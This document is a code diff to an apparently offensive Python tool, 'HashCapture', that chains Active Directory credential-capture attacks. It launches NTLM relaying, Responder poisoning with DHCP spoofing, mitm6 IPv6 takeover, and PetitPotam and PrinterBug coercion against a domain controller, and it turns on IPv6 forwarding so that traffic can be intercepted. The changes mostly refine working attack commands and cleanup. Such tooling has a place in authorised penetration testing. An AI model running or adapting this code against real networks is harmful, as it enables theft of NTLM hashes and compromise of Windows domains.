@@ -37,6 +37,7 @@ class HashCapture:
         self.processes = {}
         self.attack_threads = []
         self.local_ip = self.get_local_ip()
+        self.original_ipv6_forward = None
 
         # Get the global logger instance
         self.logger = logging.getLogger(__name__)
@@ -50,7 +51,7 @@ class HashCapture:
             "printerbug": logging.getLogger("printerbug")
         }
 
-        # Configure attack loggers with console output
+        # Configure attack loggers
         for name, logger in self.attack_loggers.items():
             logger.setLevel(logging.DEBUG if verbose else logging.INFO)
             # Add console handler
@@ -61,10 +62,37 @@ class HashCapture:
             file_handler = logging.FileHandler(f'{name}_attack.log')
             file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
             logger.addHandler(file_handler)
-        
+
         # Configure signal handlers
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
+
+    def setup_ipv6_forwarding(self):
+        """Setup IPv6 forwarding"""
+        try:
+            # Read original value
+            with open('/proc/sys/net/ipv6/conf/all/forwarding', 'r') as f:
+                self.original_ipv6_forward = f.read().strip()
+            
+            # Enable forwarding
+            with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
+                f.write('1')
+            
+            self.logger.info("IPv6 forwarding enabled")
+            return True
+        except Exception as e:
+            self.logger.error(f"Failed to enable IPv6 forwarding: {e}")
+            return False
+
+    def restore_ipv6_forwarding(self):
+        """Restore original IPv6 forwarding state"""
+        try:
+            if self.original_ipv6_forward is not None:
+                with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
+                    f.write(self.original_ipv6_forward)
+                self.logger.info("IPv6 forwarding restored to original state")
+        except Exception as e:
+            self.logger.error(f"Failed to restore IPv6 forwarding: {e}")
 
     def check_dependencies(self):
         """Check if all required tools and modules are installed and accessible"""
@@ -147,25 +175,27 @@ class HashCapture:
                     break
                 if line:
                     # Line is already a string when using universal_newlines=True
-                    line_str = line.strip()
-                    logger.info(f"{name}: {line_str}")
+                    logger.info(f"{name}: {line.strip()}")
         except Exception as e:
             self.logger.error(f"Error processing output for {name}: {e}")
 
     def cleanup(self):
-        """Clean up running processes"""
+        """Clean up running processes and restore system state"""
         self.logger.info("Cleaning up processes")
         for name, process in self.processes.items():
             try:
                 self.logger.info(f"Terminating {name}")
                 process.terminate()
-                process.wait(timeout=5)
+                try:
+                    process.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    process.kill()
+                    process.wait()
             except Exception as e:
                 self.logger.error(f"Error cleaning up {name}: {e}")
-                try:
-                    process.kill()
-                except:
-                    pass
+
+        # Restore IPv6 forwarding
+        self.restore_ipv6_forwarding()
 
     def start_ntlmrelay(self):
         """Start NTLM relay attack"""
@@ -194,7 +224,6 @@ class HashCapture:
             )
             self.processes["ntlmrelay"] = process
             
-            # Start output processing in a separate thread
             output_thread = Thread(
                 target=self.process_output,
                 args=(process, self.attack_loggers["ntlmrelay"], "NTLM Relay")
@@ -213,14 +242,10 @@ class HashCapture:
             cmd = [
                 "responder",
                 "-I", self.interface,
-                "-wrf",
-                "-v"
+                "-w",  # Enable WinPopup spoofing
+                "-d",  # Enable DHCP spoofing
+                "-v"   # Verbose
             ]
-
-            if self.domain:
-                cmd.extend([
-                    "-r", f"ldaps://{self.domain}"
-                ])
 
             self.logger.info(f"Starting Responder with command: {' '.join(cmd)}")
             process = Popen(
@@ -232,7 +257,6 @@ class HashCapture:
             )
             self.processes["responder"] = process
 
-            # Start output processing in a separate thread
             output_thread = Thread(
                 target=self.process_output,
                 args=(process, self.attack_loggers["responder"], "Responder")
@@ -248,7 +272,7 @@ class HashCapture:
     def start_mitm6(self):
         """Start mitm6 attack"""
         try:
-            cmd = ["mitm6", "-i", self.interface, "-v"]
+            cmd = ["mitm6", "-i", self.interface, "--no-ra", "-v"]
             
             if self.domain:
                 cmd.extend(["-d", self.domain])
@@ -263,7 +287,6 @@ class HashCapture:
             )
             self.processes["mitm6"] = process
             
-            # Start output processing in a separate thread
             output_thread = Thread(
                 target=self.process_output,
                 args=(process, self.attack_loggers["mitm6"], "MITM6")
@@ -285,9 +308,11 @@ class HashCapture:
 
             cmd = [
                 "petitpotam.py",
+                self.local_ip,     # Listener (our machine)
+                self.get_dc_ip(),  # Target (DC)
                 "-d", self.domain,
                 "-u", "anonymous",
-                "-target", self.get_dc_ip()
+                "-no-pass"
             ]
             
             self.logger.info(f"Starting PetitPotam with command: {' '.join(cmd)}")
@@ -300,7 +325,6 @@ class HashCapture:
             )
             self.processes["petitpotam"] = process
             
-            # Start output processing in a separate thread
             output_thread = Thread(
                 target=self.process_output,
                 args=(process, self.attack_loggers["petitpotam"], "PetitPotam")
@@ -337,7 +361,6 @@ class HashCapture:
             )
             self.processes["printerbug"] = process
             
-            # Start output processing in a separate thread
             output_thread = Thread(
                 target=self.process_output,
                 args=(process, self.attack_loggers["printerbug"], "PrinterBug")
@@ -358,6 +381,11 @@ class HashCapture:
         self.logger.info("Running system and dependency checks...")
         if not self.check_dependencies():
             self.logger.error("Dependency checks failed")
+            return False
+
+        # Setup IPv6 forwarding
+        if not self.setup_ipv6_forwarding():
+            self.logger.error("Failed to setup IPv6 forwarding")
             return False
         
         try:
@@ -390,6 +418,9 @@ class HashCapture:
                 
         except KeyboardInterrupt:
             self.logger.info("Operation interrupted by user")
+        except Exception as e:
+            self.logger.error(f"Error in main execution: {e}")
+            return False
         finally:
             self.cleanup()
         
